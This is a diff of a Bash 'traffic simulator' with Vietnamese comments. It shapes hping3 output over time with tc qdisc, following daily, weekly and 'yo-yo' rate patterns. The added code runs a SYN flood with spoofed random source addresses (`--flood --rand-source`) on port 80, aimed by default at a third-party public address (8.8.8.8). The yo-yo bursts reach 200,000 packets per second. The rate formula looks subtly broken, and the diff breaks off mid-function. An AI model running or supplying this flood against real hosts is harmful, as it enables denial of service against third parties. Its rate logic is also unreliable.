@@ -1,536 +1,590 @@
 #!/bin/bash
 
 # =================================================================
-# OPTIMIZED HPING3 TRAFFIC SIMULATOR WITH TIME COMPRESSION
+# HPING3 TRAFFIC SIMULATOR WITH TC QDISC OPTIMIZATION
 # =================================================================
+# Mô phỏng lưu lượng mạng với chu kỳ rút ngắn nhưng giữ nguyên pattern
+# Sử dụng tc qdisc để điều chỉnh rate in-place thay vì kill/spawn hping3
 
-set -euo pipefail  # Exit on error, undefined vars, pipe failures thì trả lại error ở command bị fail
-
-# Cấu hình mặc định với readonly
-readonly SCRIPT_NAME=$(basename "$0")
-readonly SCRIPT_DIR=$(dirname "$(realpath "$0")")
-readonly PID_FILE="/tmp/${SCRIPT_NAME}.pid"
-readonly DEFAULT_LOG_DIR="./logs"
-
-# Tạo thư mục log nếu chưa tồn tại
-mkdir -p "$DEFAULT_LOG_DIR"
-
-# Cấu hình với validation
+# Cấu hình mặc định
 TARGET_IP="${1:-8.8.8.8}"
-INTERFACE="${2:-$(ip route | grep '^default' | grep -o 'dev [^ ]*' | cut -d' ' -f2 | head -1)}"         # Tự lấy tên card mạng thay vì để user nhập vào
+INTERFACE="${2:-eth0}"
 DURATION="${3:-300}"
 TIME_COMPRESSION="${4:-72}"
-MODE="${5:-compressed}"
-YOYO_TYPE="${6:-square}"
+LOG_FILE="hping3_traffic_tc_$(date +%Y%m%d_%H%M%S).log"
+VERBOSE=true
 
-readonly TARGET_IP INTERFACE DURATION TIME_COMPRESSION MODE YOYO_TYPE
-readonly LOG_FILE="${DEFAULT_LOG_DIR}/hping3_traffic_$(date +%Y%m%d_%H%M%S).log"
-readonly VERBOSE=${VERBOSE:-true}
+# Cấu hình TC QDISC
+PACKET_SIZE=60          # bytes (typical SYN packet)
+BURST_SIZE="64k"        # Token bucket burst size
+LATENCY="200ms"         # Maximum latency for tokens
+MIN_RATE="1kbit"        # Minimum rate to avoid qdisc errors
+MAX_RATE="1gbit"        # Maximum rate limit
 
-# Mảng để lưu PIDs của background processes
-declare -a BACKGROUND_PIDS=()
+# PID của hping3 process
+HPING_PID=""
+TC_ACTIVE=false
 
-# Trap để cleanup khi script kết thúc
-cleanup() {
-    local exit_code=$?
-    log "Cleaning up..."
-    
-    # Kill all background processes, lặp theo all IDs
-    for pid in "${BACKGROUND_PIDS[@]}"; do
-        if kill -0 "$pid" 2>/dev/null; then
-            kill "$pid" 2>/dev/null && wait "$pid" 2>/dev/null || true
-        fi
-    done
-    
-    # Kill all hping3 processes
-    pkill -f "hping3.*$TARGET_IP" 2>/dev/null || true
-    
-    # Remove PID file
-    [[ -f "$PID_FILE" ]] && rm -f "$PID_FILE"
-    
-    log "Cleanup completed with exit code: $exit_code"
-    exit $exit_code
-}
-
-trap cleanup EXIT INT TERM
-
-# ghi log vào file log
+# Hàm logging
 log() {
-    local level="${2:-INFO}"
     local message="$1"
     local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
-    printf "[%s] [%s] %s\n" "$timestamp" "$level" "$message" | tee -a "$LOG_FILE"
+    echo "[$timestamp] $message" | tee -a "$LOG_FILE"
 }
 
-log_error() { log "$1" "ERROR"; }
-log_warn() { log "$1" "WARN"; }
-log_debug() { [[ "$VERBOSE" == true ]] && log "$1" "DEBUG"; }
-
-# Validation functions
-# Check IP, phải nhỏ hơn 255
-validate_ip() {
-    local ip="$1"
-    if [[ ! $ip =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
-        log_error "Invalid IP address: $ip"
-        return 1
-    fi
+# Hàm cleanup - quan trọng để dọn dẹp tc qdisc
+cleanup() {
+    log "=== CLEANUP STARTED ==="
     
-    IFS='.' read -ra ADDR <<< "$ip"
-    for i in "${ADDR[@]}"; do
-        if [[ $i -gt 255 ]]; then
-            log_error "Invalid IP address: $ip"
-            return 1
+    # Kill hping3 process
+    if [ -n "$HPING_PID" ] && kill -0 "$HPING_PID" 2>/dev/null; then
+        log "Killing hping3 process (PID: $HPING_PID)"
+        kill -TERM "$HPING_PID"
+        sleep 2
+        if kill -0 "$HPING_PID" 2>/dev/null; then
+            kill -KILL "$HPING_PID"
         fi
-    done
-    return 0
-}
-
-#Check xem network interface name có chính xác không
-validate_interface() {
-    local iface="$1"
-    if ! ip link show "$iface" &>/dev/null; then
-        log_error "Interface $iface not found"
-        return 1
-    fi
-    return 0
-}
-
-# Check số nguyên dương
-validate_numeric() {
-    local value="$1"
-    local name="$2"
-    if ! [[ "$value" =~ ^[0-9]+$ ]]; then
-        log_error "$name must be a positive integer: $value"
-        return 1
-    fi
-    return 0
-}
-
-# Math helper functions với cache, sử dụng để lưu cặp key  -value, phép toán - kết quả
-declare -A MATH_CACHE=()
-
-cached_bc() {
-    local expr="$1"
-    local precision="${2:-6}"
-    local cache_key="${expr}_${precision}"
-    
-    if [[ -n "${MATH_CACHE[$cache_key]:-}" ]]; then
-        echo "${MATH_CACHE[$cache_key]}"
-        return
+        wait "$HPING_PID" 2>/dev/null
     fi
     
-    local result=$(echo "scale=$precision; $expr" | bc -l 2>/dev/null || echo "0")
-    MATH_CACHE[$cache_key]="$result"
-    echo "$result"
+    # Remove tc qdisc
+    if [ "$TC_ACTIVE" = true ]; then
+        log "Removing tc qdisc from interface $INTERFACE"
+        tc qdisc del dev "$INTERFACE" root 2>/dev/null || true
+        TC_ACTIVE=false
+    fi
+    
+    log "=== CLEANUP COMPLETED ==="
+    exit 0
 }
 
-# Pre-calculate constants
-readonly PI="3.14159265359"
-readonly E="2.71828182846"
+# Trap cleanup on script exit
+trap cleanup EXIT INT TERM
 
-# Optimized time calculation functions, gộp gọn vào thành 1 hàm so với bản cũ
-get_virtual_time() {
-    local elapsed_seconds="$1"
-    local virtual_seconds=$(cached_bc "$elapsed_seconds * $TIME_COMPRESSION" 0)
+# Hàm tính toán thời gian thực tế dựa trên compression
+get_compressed_hour() {
+    local elapsed_seconds=$1
+    local compression_factor=$TIME_COMPRESSION
     
-    local hours=$(( (virtual_seconds / 3600) % 24 ))
-    local minutes=$(( (virtual_seconds % 3600) / 60 ))
-    local days=$(( (virtual_seconds / 86400) % 7 + 1 ))
+    local virtual_hours=$(echo "scale=6; $elapsed_seconds * $compression_factor / 3600" | bc -l)
+    local current_hour=$(echo "scale=0; $virtual_hours % 24" | bc -l)
     
-    printf "%d %d %d" "$hours" "$minutes" "$days"
+    echo "$current_hour"
 }
 
-# Optimized traffic calculation với lookup table cho common values
-declare -A HOURLY_RATE_CACHE=()
+get_compressed_day() {
+    local elapsed_seconds=$1
+    local compression_factor=$TIME_COMPRESSION
+    
+    local virtual_hours=$(echo "scale=6; $elapsed_seconds * $compression_factor / 3600" | bc -l)
+    local virtual_days=$(echo "scale=6; $virtual_hours / 24" | bc -l)
+    local day_of_week=$(echo "scale=0; ($virtual_days % 7) + 1" | bc -l)
+    
+    echo "$day_of_week"
+}
 
+# Hàm tính toán traffic rate theo giờ (giữ nguyên công thức)
 calculate_hourly_rate() {
-    local hour="$1"
-    
-    # Check cache first
-    if [[ -n "${HOURLY_RATE_CACHE[$hour]:-}" ]]; then
-        echo "${HOURLY_RATE_CACHE[$hour]}"
-        return
-    fi
-    
+    local hour=$1
     local base_rate=50000
     local max_rate=90000
     
-    # Optimized mathematical functions
-    local morning_peak=$(cached_bc "25 * e(-1 * (($hour - 9) ^ 2) / 6.25)")
-    local evening_peak=$(cached_bc "45 * e(-1 * (($hour - 20) ^ 2) / 7.84)")
-    local night_drop=$(cached_bc "-15 * e(-1 * (($hour - 2.5) ^ 2) / 3.24)")
-    local daily_cycle=$(cached_bc "5 * s($PI * $hour / 12 - $PI/2)")
+    # Hàm T(t) - Traffic pattern theo giờ
+    local morning_peak=$(echo "scale=6; 25 * e(-1 * (($hour - 9) ^ 2) / 6.25)" | bc -l) 
+    local evening_peak=$(echo "scale=6; 45 * e(-1 * (($hour - 20) ^ 2) / 7.84)" | bc -l)
+    local night_drop=$(echo "scale=6; -15 * e(-1 * (($hour - 2.5) ^ 2) / 3.24)" | bc -l)
+    local daily_cycle=$(echo "scale=6; 5 * s(3.14159 * $hour / 12 - 3.14159/2)" | bc -l)
+    local base_level=20000
     
-    local traffic_factor=$(cached_bc "20000 + $morning_peak + $evening_peak + $night_drop + $daily_cycle")
-    local pps=$(cached_bc "if($traffic_factor < 5) 5 else $base_rate + ($traffic_factor - 20) * ($max_rate - $base_rate) / 45" 0)
+    local traffic_factor=$(echo "scale=6; $base_level + $morning_peak + $evening_peak + $night_drop + $daily_cycle" | bc -l)
+    local pps=$(echo "scale=0; if($traffic_factor < 5) 5 else $base_rate + ($traffic_factor - 20) * ($max_rate - $base_rate) / 45" | bc -l)
     
-    # Cache result
-    HOURLY_RATE_CACHE[$hour]="$pps"
+    # Đảm bảo minimum rate
+    local is_less_than_5=$(echo "$pps < 5" | bc -l)
+    if [ "$is_less_than_5" -eq 1 ]; then
+        pps=5
+    fi
+    
     echo "$pps"
 }
 
-# Weekly multiplier với cache
-declare -A WEEKLY_CACHE=()
-
+# Hàm tính toán traffic rate theo ngày trong tuần
 calculate_weekly_multiplier() {
-    local day="$1"
-    
-    if [[ -n "${WEEKLY_CACHE[$day]:-}" ]]; then
-        echo "${WEEKLY_CACHE[$day]}"
-        return
-    fi
-    
+    local day_of_week=$1
     local base=87
-    local sine_component=$(cached_bc "8 * s(2 * $PI * $day / 7 + $PI/7)")
-    local weekend_spike=$(cached_bc "5 * e(-1 * (($day - 6) ^ 2) / 2.25)")
-    local weekly_factor=$(cached_bc "($base + $sine_component + $weekend_spike) / $base")
+    local sine_component=$(echo "scale=6; 8 * s(2 * 3.14159 * $day_of_week / 7 + 3.14159/7)" | bc -l)
+    local weekend_spike=$(echo "scale=6; 5 * e(-1 * (($day_of_week - 6) ^ 2) / 2.25)" | bc -l)
+    local weekly_factor=$(echo "scale=6; ($base + $sine_component + $weekend_spike) / $base" | bc -l)
     
-    WEEKLY_CACHE[$day]="$weekly_factor"
     echo "$weekly_factor"
 }
 
-# Optimized hping3 execution với connection pooling concept
-run_hping3_optimized() {
-    local target="$1"
-    local rate="$2" 
-    local duration="$3"
+# Hàm mô phỏng minute pattern với time compression
+get_compressed_minute_in_hour() {
+    local elapsed_seconds=$1
+    local compression_factor=$TIME_COMPRESSION
     
-    # Validate and sanitize rate
-    local rate_int=$(cached_bc "$rate" 0)
-    rate_int=${rate_int%.*}  # Remove decimal part
-    [[ $rate_int -lt 1 ]] && rate_int=1
-    [[ $rate_int -gt 100000 ]] && rate_int=100000  # Rate limit
+    local virtual_seconds=$(echo "scale=6; $elapsed_seconds * $compression_factor" | bc -l)
+    local seconds_in_hour=$(echo "scale=0; $virtual_seconds % 3600" | bc -l)
+    local minute_in_hour=$(echo "scale=0; $seconds_in_hour / 60" | bc -l)
     
-    local interval_us=$(cached_bc "1000000 / $rate_int" 0)
-    local total_packets=$(cached_bc "$rate_int * $duration" 0)
-    [[ ${total_packets%.*} -lt 1 ]] && total_packets=1
-    
-    log_debug "hping3: ${rate_int}pps for ${duration}s (${total_packets} packets)"
-    
-    # Use timeout để tránh hanging
-    timeout "$duration" hping3 \
-        -S -p 80 \
-        -i "u${interval_us%.*}" \
-        -c "${total_packets%.*}" \
-        --interface "$INTERFACE" \
-        "$target" \
-        >>"$LOG_FILE" 2>&1 &
-    
-    local pid=$!
-    BACKGROUND_PIDS+=($pid)
-    echo "$pid"
+    echo "$minute_in_hour"
 }
 
-# Pattern generators với optimized loops
-generate_compressed_pattern() {
-    local duration_seconds="$1"
+# Hàm chuyển đổi PPS sang bandwidth (bits per second)
+pps_to_bandwidth() {
+    local pps=$1
+    local packet_size=$PACKET_SIZE
     
-    log "=== TIME COMPRESSION SIMULATION ==="
-    log "Compression: ${TIME_COMPRESSION}x | Duration: ${duration_seconds}s"
-    log "Virtual time: $(cached_bc "$duration_seconds * $TIME_COMPRESSION / 3600" 1)h"
+    # Tính bandwidth = PPS * packet_size * 8 (convert to bits)
+    local bps=$(echo "scale=0; $pps * $packet_size * 8" | bc -l)
+    
+    # Đảm bảo minimum bandwidth
+    local min_bps=1000  # 1kbps
+    if [ $(echo "$bps < $min_bps" | bc -l) -eq 1 ]; then
+        bps=$min_bps
+    fi
+    
+    # Chuyển đổi sang đơn vị phù hợp cho tc
+    if [ $(echo "$bps >= 1000000000" | bc -l) -eq 1 ]; then
+        # >= 1Gbps
+        local gbps=$(echo "scale=2; $bps / 1000000000" | bc -l)
+        echo "${gbps}gbit"
+    elif [ $(echo "$bps >= 1000000" | bc -l) -eq 1 ]; then
+        # >= 1Mbps
+        local mbps=$(echo "scale=2; $bps / 1000000" | bc -l)
+        echo "${mbps}mbit"
+    elif [ $(echo "$bps >= 1000" | bc -l) -eq 1 ]; then
+        # >= 1Kbps
+        local kbps=$(echo "scale=0; $bps / 1000" | bc -l)
+        echo "${kbps}kbit"
+    else
+        # < 1Kbps
+        echo "1kbit"
+    fi
+}
+
+# Hàm khởi tạo tc qdisc
+init_tc_qdisc() {
+    log "Initializing TC qdisc on interface $INTERFACE"
+    
+    # Remove existing qdisc if any
+    tc qdisc del dev "$INTERFACE" root 2>/dev/null || true
+    
+    # Add initial TBF qdisc with minimum rate
+    if tc qdisc add dev "$INTERFACE" root tbf rate "$MIN_RATE" burst "$BURST_SIZE" latency "$LATENCY"; then
+        TC_ACTIVE=true
+        log "TC qdisc initialized successfully"
+        return 0
+    else
+        log "ERROR: Failed to initialize TC qdisc"
+        return 1
+    fi
+}
+
+# Hàm cập nhật tc qdisc rate
+update_tc_rate() {
+    local new_rate="$1"
+    
+    if [ "$TC_ACTIVE" = true ]; then
+        if tc qdisc change dev "$INTERFACE" root tbf rate "$new_rate" burst "$BURST_SIZE" latency "$LATENCY" 2>/dev/null; then
+            return 0
+        else
+            log "WARNING: Failed to update TC rate to $new_rate, reinitializing..."
+            # Try to reinitialize
+            tc qdisc del dev "$INTERFACE" root 2>/dev/null || true
+            if tc qdisc add dev "$INTERFACE" root tbf rate "$new_rate" burst "$BURST_SIZE" latency "$LATENCY"; then
+                return 0
+            else
+                log "ERROR: Failed to reinitialize TC qdisc"
+                TC_ACTIVE=false
+                return 1
+            fi
+        fi
+    else
+        return 1
+    fi
+}
+
+# Hàm khởi chạy hping3 flood
+start_hping3_flood() {
+    log "Starting hping3 flood to $TARGET_IP"
+    
+    # Khởi chạy hping3 với flood mode
+    hping3 \
+        -S \
+        --flood \
+        --rand-source \
+        -p 80 \
+        --interface "$INTERFACE" \
+        "$TARGET_IP" \
+        >> "$LOG_FILE" 2>&1 &
+    
+    HPING_PID=$!
+    
+    if [ -n "$HPING_PID" ] && kill -0 "$HPING_PID" 2>/dev/null; then
+        log "hping3 started successfully (PID: $HPING_PID)"
+        return 0
+    else
+        log "ERROR: Failed to start hping3"
+        return 1
+    fi
+}
+
+# Hàm tạo pattern với TC qdisc optimization
+generate_compressed_pattern_tc() {
+    local duration_seconds=$1
+    local compression_factor=$TIME_COMPRESSION
+    
+    log "=== TC QDISC TIME COMPRESSION SIMULATION ==="
+    log "Compression factor: ${compression_factor}x"
+    log "Real duration: ${duration_seconds}s = Virtual duration: $(echo "scale=1; $duration_seconds * $compression_factor / 3600" | bc -l) hours"
+    log "Virtual speed: 1 real second = $(echo "scale=1; $compression_factor / 60" | bc -l) virtual minutes"
+    log "Packet size: ${PACKET_SIZE} bytes"
+    log "TC parameters: burst=$BURST_SIZE, latency=$LATENCY"
+    
+    # Khởi tạo TC qdisc
+    if ! init_tc_qdisc; then
+        log "ERROR: Cannot initialize TC qdisc, falling back to legacy mode"
+        generate_compressed_pattern_legacy "$duration_seconds"
+        return
+    fi
+    
+    # Khởi chạy hping3 flood
+    if ! start_hping3_flood; then
+        log "ERROR: Cannot start hping3 flood"
+        return 1
+    fi
+    
+    local update_interval=3  # Update mỗi 3 seconds cho smooth hơn
+    local current_time=0
+    local last_rate=""
+    
+    while [ $current_time -lt $duration_seconds ]; do
+        # Tính toán thời gian ảo
+        local virtual_hour=$(get_compressed_hour $current_time)
+        local virtual_day=$(get_compressed_day $current_time)
+        local virtual_minute=$(get_compressed_minute_in_hour $current_time)
+        
+        # Tính toán rate dựa trên các hàm pattern
+        local hourly_rate=$(calculate_hourly_rate $virtual_hour)
+        local weekly_multiplier=$(calculate_weekly_multiplier $virtual_day)
+        
+        # Thêm minute variation
+        local minute_factor=$(echo "scale=6; 1 + 0.3 * s(2 * 3.14159 * $virtual_minute / 60)" | bc -l)
+        
+        # Kết hợp các factor
+        local base_rate=$(echo "scale=6; $hourly_rate * $weekly_multiplier * $minute_factor" | bc -l)
+        
+        # Thêm nhiễu ngẫu nhiên ±15% (giảm từ 20% để ổn định hơn)
+        local noise=$(echo "scale=6; (($RANDOM % 60) - 30) / 200" | bc -l)
+        local final_rate_float=$(echo "scale=6; $base_rate * (1 + $noise)" | bc -l)
+        
+        # Chuyển về số nguyên
+        local final_pps=$(echo "scale=0; if($final_rate_float < 1) 1 else ($final_rate_float + 0.5) / 1" | bc -l)
+        
+        # Đảm bảo final_pps là số nguyên dương
+        if [ -z "$final_pps" ] || [ "$final_pps" -lt 1 ]; then
+            final_pps=1
+        fi
+        
+        # Chuyển đổi PPS sang bandwidth
+        local bandwidth=$(pps_to_bandwidth "$final_pps")
+        
+        # Chỉ update TC rate nếu khác với rate trước đó (tối ưu performance)
+        if [ "$bandwidth" != "$last_rate" ]; then
+            if update_tc_rate "$bandwidth"; then
+                log "T+${current_time}s | Virtual: Day${virtual_day} ${virtual_hour}:$(printf "%02d" $virtual_minute) | PPS: ${final_pps} | BW: ${bandwidth}"
+                last_rate="$bandwidth"
+            else
+                log "T+${current_time}s | ERROR: Failed to update TC rate to $bandwidth"
+                # Continue with old rate
+            fi
+        else
+            # Rate không đổi, chỉ log nếu verbose
+            if [ "$VERBOSE" = true ]; then
+                log "T+${current_time}s | Virtual: Day${virtual_day} ${virtual_hour}:$(printf "%02d" $virtual_minute) | PPS: ${final_pps} | BW: ${bandwidth} [unchanged]"
+            fi
+        fi
+        
+        # Đợi interval
+        sleep $update_interval
+        current_time=$((current_time + update_interval))
+    done
+}
+
+# Hàm legacy cho trường hợp TC qdisc không hoạt động
+generate_compressed_pattern_legacy() {
+    local duration_seconds=$1
+    
+    log "=== LEGACY MODE (KILL/SPAWN) ==="
+    log "Using original kill/spawn method as fallback"
     
     local update_interval=5
     local current_time=0
-    local pids_to_cleanup=()
     
-    while [[ $current_time -lt $duration_seconds ]]; do
-        # Get virtual time components
-        read -r virtual_hour virtual_minute virtual_day <<< "$(get_virtual_time $current_time)"
+    while [ $current_time -lt $duration_seconds ]; do
+        local virtual_hour=$(get_compressed_hour $current_time)
+        local virtual_day=$(get_compressed_day $current_time)
+        local virtual_minute=$(get_compressed_minute_in_hour $current_time)
         
-        # Calculate rates
-        local hourly_rate=$(calculate_hourly_rate "$virtual_hour")
-        local weekly_multiplier=$(calculate_weekly_multiplier "$virtual_day")
-        local minute_factor=$(cached_bc "1 + 0.3 * s(2 * $PI * $virtual_minute / 60)")
+        local hourly_rate=$(calculate_hourly_rate $virtual_hour)
+        local weekly_multiplier=$(calculate_weekly_multiplier $virtual_day)
+        local minute_factor=$(echo "scale=6; 1 + 0.3 * s(2 * 3.14159 * $virtual_minute / 60)" | bc -l)
         
-        # Combine factors with optimized calculation
-        local base_rate=$(cached_bc "$hourly_rate * $weekly_multiplier * $minute_factor")
-        local noise=$(cached_bc "(($RANDOM % 40) - 20) / 100")
-        local final_rate=$(cached_bc "($base_rate * (1 + $noise))" 0)
+        local base_rate=$(echo "scale=6; $hourly_rate * $weekly_multiplier * $minute_factor" | bc -l)
+        local noise=$(echo "scale=6; (($RANDOM % 80) - 100) / 500" | bc -l)
+        local final_rate_float=$(echo "scale=6; $base_rate * (1 + $noise)" | bc -l)
+        local final_rate=$(echo "scale=0; if($final_rate_float < 1) 1 else ($final_rate_float + 0.5) / 1" | bc -l)
         
-        # Ensure minimum rate
-        final_rate=${final_rate%.*}
-        [[ $final_rate -lt 1 ]] && final_rate=1
-        
-        # Progress indicator
-        local progress=$(cached_bc "$current_time * 100 / $duration_seconds" 0)
-        log "Progress: ${progress%.*}% | T+${current_time}s | Virtual: Day${virtual_day} ${virtual_hour}:$(printf "%02d" "$virtual_minute") | Rate: ${final_rate}pps"
-        
-        # Run hping3
-        local hping_pid=$(run_hping3_optimized "$TARGET_IP" "$final_rate" "$update_interval")
-        pids_to_cleanup+=($hping_pid)
-        
-        # Cleanup old processes (keep array size manageable)
-        if [[ ${#pids_to_cleanup[@]} -gt 10 ]]; then
-            for old_pid in "${pids_to_cleanup[@]:0:5}"; do
-                kill "$old_pid" 2>/dev/null || true
-            done
-            pids_to_cleanup=("${pids_to_cleanup[@]:5}")
+        if [ -z "$final_rate" ] || [ "$final_rate" -lt 1 ]; then
+            final_rate=1
         fi
         
-        sleep "$update_interval"
+        log "T+${current_time}s | Virtual: Day${virtual_day} ${virtual_hour}:$(printf "%02d" $virtual_minute) | Rate: ${final_rate}pps [LEGACY]"
+        
+        run_hping3_burst "$TARGET_IP" "$final_rate" "$update_interval" &
+        local hping_pid=$!
+        
+        sleep $update_interval
+        
+        if kill -0 $hping_pid 2>/dev/null; then
+            kill $hping_pid
+            wait $hping_pid 2>/dev/null
+        fi
+        
         current_time=$((current_time + update_interval))
     done
+}
+
+# Hàm tạo Yo-Yo pattern với TC optimization
+generate_yoyo_pattern_tc() {
+    local duration_seconds=$1
+    local yoyo_type="${2:-square}"
     
-    # Final cleanup
-    for pid in "${pids_to_cleanup[@]}"; do
-        kill "$pid" 2>/dev/null || true
-    done
-}
-
-# Optimized Yo-Yo patterns với function pointer concept, tăng tính mở rộng, bảo trì
-declare -A YOYO_PATTERNS=(
-    ["square"]="yoyo_square"
-    ["sawtooth"]="yoyo_sawtooth"
-    ["sine"]="yoyo_sine"
-    ["burst"]="yoyo_burst"
-    ["step"]="yoyo_step"
-    ["random"]="yoyo_random"
-)
-
-yoyo_square() {
-    local cycle_pos="$1"
-    local is_first_half=$(cached_bc "$cycle_pos < 0.5" 0)
-    [[ ${is_first_half%.*} -eq 1 ]] && echo "80" || echo "20"
-}
-
-yoyo_sawtooth() {
-    local cycle_pos="$1"
-    local is_ramp=$(cached_bc "$cycle_pos < 0.8" 0)
-    if [[ ${is_ramp%.*} -eq 1 ]]; then
-        cached_bc "10 + 90 * $cycle_pos / 0.8" 0
-    else
-        echo "10"
-    fi
-}
-
-yoyo_sine() {
-    local cycle_pos="$1"
-    cached_bc "50 + 45 * s(2 * $PI * $cycle_pos)" 0
-}
-
-yoyo_burst() {
-    local cycle_pos="$1"
-    local is_burst=$(cached_bc "$cycle_pos < 0.1" 0)
-    local is_cooldown=$(cached_bc "$cycle_pos < 0.2" 0)
+    log "=== TC QDISC YO-YO PATTERN SIMULATION ==="
+    log "Type: $yoyo_type | Duration: ${duration_seconds}s"
+    log "Simulating bot/automated traffic behavior with TC qdisc"
     
-    if [[ ${is_burst%.*} -eq 1 ]]; then
-        echo "200"
-    elif [[ ${is_cooldown%.*} -eq 1 ]]; then
-        echo "50"
-    else
-        echo "5"
-    fi
-}
-
-yoyo_step() {
-    local cycle_pos="$1"
-    local step1=$(cached_bc "$cycle_pos < 0.25" 0)
-    local step2=$(cached_bc "$cycle_pos < 0.5" 0) 
-    local step3=$(cached_bc "$cycle_pos < 0.75" 0)
-    
-    if [[ ${step1%.*} -eq 1 ]]; then echo "20"
-    elif [[ ${step2%.*} -eq 1 ]]; then echo "50"
-    elif [[ ${step3%.*} -eq 1 ]]; then echo "80"
-    else echo "100"
-    fi
-}
-
-yoyo_random() {
-    local cycle_pos="$1"
-    local phase1=$(cached_bc "$cycle_pos < 0.3" 0)
-    local phase2=$(cached_bc "$cycle_pos < 0.7" 0)
-    local random_factor=$(cached_bc "($RANDOM % 50) / 100" 2)
-    
-    if [[ ${phase1%.*} -eq 1 ]]; then
-        cached_bc "80 + 20 * $random_factor" 0
-    elif [[ ${phase2%.*} -eq 1 ]]; then
-        cached_bc "40 + 30 * $random_factor" 0
-    else
-        cached_bc "5 + 15 * $random_factor" 0
-    fi
-}
-
-generate_yoyo_pattern() {
-    local duration_seconds="$1"
-    local yoyo_type="$2"
-    
-    # Validate pattern type
-    if [[ -z "${YOYO_PATTERNS[$yoyo_type]:-}" ]]; then
-        log_error "Unknown yo-yo pattern: $yoyo_type"
+    # Khởi tạo TC qdisc
+    if ! init_tc_qdisc; then
+        log "ERROR: Cannot initialize TC qdisc for yo-yo pattern"
         return 1
     fi
     
-    log "=== YO-YO PATTERN: $yoyo_type ==="
-    log "Duration: ${duration_seconds}s"
+    # Khởi chạy hping3 flood
+    if ! start_hping3_flood; then
+        log "ERROR: Cannot start hping3 flood for yo-yo pattern"
+        return 1
+    fi
     
     local update_interval=2
-    local cycle_duration=20
     local current_time=0
-    local pattern_func="${YOYO_PATTERNS[$yoyo_type]}"
+    local cycle_duration=20
     
-    while [[ $current_time -lt $duration_seconds ]]; do
-        local cycle_position=$(cached_bc "($current_time % $cycle_duration) / $cycle_duration" 4)
-        local rate=$($pattern_func "$cycle_position")
-        rate=${rate%.*}
-        [[ $rate -lt 1 ]] && rate=1
+    while [ $current_time -lt $duration_seconds ]; do
+        local cycle_position=$(echo "scale=6; ($current_time % $cycle_duration) / $cycle_duration" | bc -l)
+        local pps=10000
         
-        log "T+${current_time}s | Cycle: $(printf "%.2f" "$cycle_position") | Rate: ${rate}pps"
+        case "$yoyo_type" in
+            "square")
+                local is_first_half=$(echo "$cycle_position < 0.5" | bc -l)
+                if [ "$is_first_half" -eq 1 ]; then
+                    pps=100000
+                else
+                    pps=10000
+                fi
+                ;;
+            "sawtooth")
+                local is_ramp_phase=$(echo "$cycle_position < 0.8" | bc -l)
+                if [ "$is_ramp_phase" -eq 1 ]; then
+                    local rate_float=$(echo "scale=6; 10000 + 90000 * $cycle_position / 0.8" | bc -l)
+                    pps=$(echo "scale=0; ($rate_float + 0.5) / 1" | bc -l)
+                else
+                    pps=10000
+                fi
+                ;;
+            "burst")
+                local is_burst_phase=$(echo "$cycle_position < 0.1" | bc -l)
+                local is_cooldown_phase=$(echo "$cycle_position < 0.2" | bc -l)
+                
+                if [ "$is_burst_phase" -eq 1 ]; then
+                    pps=200000
+                elif [ "$is_cooldown_phase" -eq 1 ]; then
+                    pps=50000
+                else
+                    pps=5000
+                fi
+                ;;
+            *)
+                pps=50000
+                ;;
+        esac
         
-        local hping_pid=$(run_hping3_optimized "$TARGET_IP" "$rate" "$update_interval")
+        if [ -z "$pps" ] || [ "$pps" -lt 1 ]; then
+            pps=1000
+        fi
         
-        sleep "$update_interval"
-        kill "$hping_pid" 2>/dev/null || true
+        local bandwidth=$(pps_to_bandwidth "$pps")
         
+        if update_tc_rate "$bandwidth"; then
+            log "T+${current_time}s | Cycle: $(printf "%.2f" $cycle_position) | PPS: ${pps} | BW: ${bandwidth} [$yoyo_type]"
+        else
+            log "T+${current_time}s | ERROR: Failed to update yo-yo rate to $bandwidth"
+        fi
+        
+        sleep $update_interval
         current_time=$((current_time + update_interval))
     done
 }
 
-# Enhanced dependency check
+# Hàm legacy run_hping3_burst (backup)
+run_hping3_burst() {
+    local target=$1
+    local rate=$2
+    local duration=$3
+    
+    local rate_int=$(echo "scale=0; $rate / 1" | bc -l)
+    local interval_us=$(echo "scale=0; 1000000 / $rate_int" | bc -l)
+    local total_packets=$(echo "scale=0; $rate_int * $duration" | bc -l)
+    
+    if [ "$total_packets" -lt 1 ]; then
+        total_packets=1
+    fi
+    
+    hping3 \
+        -S \
+        -p 80 \
+        -i "u$interval_us" \
+        -c "$total_packets" \
+        --interface "$INTERFACE" \
+        "$target" \
+        >> "$LOG_FILE" 2>&1 || true
+}
+
+# Hàm kiểm tra dependencies
 check_dependencies() {
-    local deps=("hping3" "bc" "timeout" "ip" "pkill")
-    local missing=()
+    local missing_deps=()
     
-    for dep in "${deps[@]}"; do
-        if ! command -v "$dep" &>/dev/null; then
-            missing+=("$dep")
-        fi
-    done
-    
-    if [[ ${#missing[@]} -gt 0 ]]; then
-        log_error "Missing dependencies: ${missing[*]}"
-        log "Install with: apt-get install ${missing[*]}"
-        exit 1
+    if ! command -v hping3 &> /dev/null; then
+        missing_deps+=("hping3")
     fi
     
-    # Check permissions
+    if ! command -v bc &> /dev/null; then
+        missing_deps+=("bc")
+    fi
+    
+    if ! command -v tc &> /dev/null; then
+        missing_deps+=("iproute2")
+    fi
+    
     if [[ $EUID -ne 0 ]]; then
-        log_warn "Root privileges recommended for hping3"
-    fi
-    
-    # Check if another instance is running
-    if [[ -f "$PID_FILE" ]] && kill -0 "$(cat "$PID_FILE")" 2>/dev/null; then
-        log_error "Another instance is already running (PID: $(cat "$PID_FILE"))"
+        log "ERROR: Root privileges required for hping3 and tc qdisc"
         exit 1
     fi
     
-    echo $$ > "$PID_FILE"
-}
-
-# Enhanced connectivity test
-test_connectivity() {
-    log "Testing connectivity to $TARGET_IP..."
-    
-    if ! timeout 5 ping -c 2 -W 2 "$TARGET_IP" &>/dev/null; then
-        log_warn "Target $TARGET_IP may not be reachable"
-        return 1
+    if [ ${#missing_deps[@]} -gt 0 ]; then
+        log "ERROR: Missing dependencies: ${missing_deps[*]}"
+        log "Install with: apt-get install ${missing_deps[*]}"
+        exit 1
     fi
     
-    # Test interface
-    if ! timeout 3 ping -I "$INTERFACE" -c 1 -W 2 "$TARGET_IP" &>/dev/null; then
-        log_warn "Interface $INTERFACE may have connectivity issues"
-        return 1
+    # Test interface exists
+    if ! ip link show "$INTERFACE" &>/dev/null; then
+        log "ERROR: Interface $INTERFACE does not exist"
+        log "Available interfaces:"
+        ip link show | grep -E "^[0-9]+:" | awk -F: '{print "  " $2}' | tee -a "$LOG_FILE"
